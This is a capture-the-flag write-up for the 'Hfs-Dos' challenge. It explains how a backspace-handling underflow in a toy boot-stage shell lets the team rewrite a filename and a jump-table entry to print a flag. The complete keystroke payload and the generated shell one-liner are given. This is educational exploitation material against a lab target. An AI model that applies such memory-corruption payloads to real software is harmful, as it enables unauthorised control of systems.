# Hfs-Dos
#### Author: Paweł Wieczorek aka cerber-os
*This challenge is continuation of Hfs-mbr task.*

In this challenge our goal was to print flag stored in file `FLAG2`.

###### Stage 3.
After bootloader accepts our password, it loads the third stage, which is a very simple shell named hfs-dos. Using the same method as in the previous task (i.e. in gdb: setting breakpoint and dumping program code), we've extracted program of this shell and started reverse engineering.

There was a bug in the way program handles backspace key - it decreases pointer to the current letter in buffer, but does not check if any character is still there. By using this vulnerability we could decrease the pointer to where our 4 letter command will be entered and overwrite data behind input buffer. The interesting part of program memory looks as follow:
```
jumpList:         dw offset loc_162         ;; Address of function ping
                  dw offset loc_165         ;; Address of function vers
                  dw offset loc_168         ;; Address of function myid
                  dw offset loc_16B         ;; Address of function pong
                  dw offset loc_16E         ;; Address of function exit
                  db  71h ; q
                  db    1
                  db 'FLAG1',0,'$'          ;; The name of file opened by function printFlag
userInputBuffer:  db    0                   ;; Input buffer
                  db    0
                  db    0
                  db    0
                  db    0
```
Our plan was to:
* overwrite the last four bytes of string `FLAG1` -> `FLAG2`
* overwrite address of `exit` function stored in `jumpList` to the address of `printFlag` function, which was used to print flag in Hfs-mbr challenge.
* call `exit` function

The payload to achive this:
```python
list("sojupwner") + ['\\n'] +                                      \
	["\\x7f"]*6 + list("LAG2") +                                   \
	["\\x7f"]*12 + ["\\x4f"] + ["\\x4f"] + ["\\x4f"] + ["\\x4f"] + \
	list("exit") + ['\\n']
```
We've tried to pipe output of `echo -ne '<above payload>'` directly to qemu, but sadly some characters were lost (maybe too fast entering). To solve this we've written simple python script injecting `sleep 0.4` beetwen each command echoing character:

```python
s = ['<above_payload>']
def gen(): 
    print("(",end="") 
    for l in s: 
    	print("sleep 0.4; echo -ne \"" + l + "\"", end="; ") 
    print(";echo \"\\n\\n\\n\") | ./run",end="")
```

The final (enormous) payload:
```sh
(sleep 0.4; echo -ne "s"; sleep 0.4; echo -ne "o"; sleep 0.4; echo -ne "j"; sleep 0.4; echo -ne "u"; sleep 0.4; echo -ne "p"; sleep 0.4; echo -ne "w"; sleep 0.4; echo -ne "n"; sleep 0.4; echo -ne "e"; sleep 0.4; echo -ne "r"; sleep 0.4; echo -ne "\n"; sleep 0.4; echo -ne "\x7f"; sleep 0.4; echo -ne "\x7f"; sleep 0.4; echo -ne "\x7f"; sleep 0.4; echo -ne "\x7f"; sleep 0.4; echo -ne "\x7f"; sleep 0.4; echo -ne "\x7f"; sleep 0.4; echo -ne "L"; sleep 0.4; echo -ne "A"; sleep 0.4; echo -ne "G"; sleep 0.4; echo -ne "2"; sleep 0.4; echo -ne "\x7f"; sleep 0.4; echo -ne "\x7f"; sleep 0.4; echo -ne "\x7f"; sleep 0.4; echo -ne "\x7f"; sleep 0.4; echo -ne "\x7f"; sleep 0.4; echo -ne "\x7f"; sleep 0.4; echo -ne "\x7f"; sleep 0.4; echo -ne "\x7f"; sleep 0.4; echo -ne "\x7f"; sleep 0.4; echo -ne "\x7f"; sleep 0.4; echo -ne "\x7f"; sleep 0.4; echo -ne "\x7f"; sleep 0.4; echo -ne "\x4f"; sleep 0.4; echo -ne "\x4f"; sleep 0.4; echo -ne "\x4f"; sleep 0.4; echo -ne "\x4f"; sleep 0.4; echo -ne "e"; sleep 0.4; echo -ne "x"; sleep 0.4; echo -ne "i"; sleep 0.4; echo -ne "t"; sleep 0.4; echo -ne "\n"; ;echo "\n\n\n") | ./run
```

After executing it on the remote machine, we've got the flag.
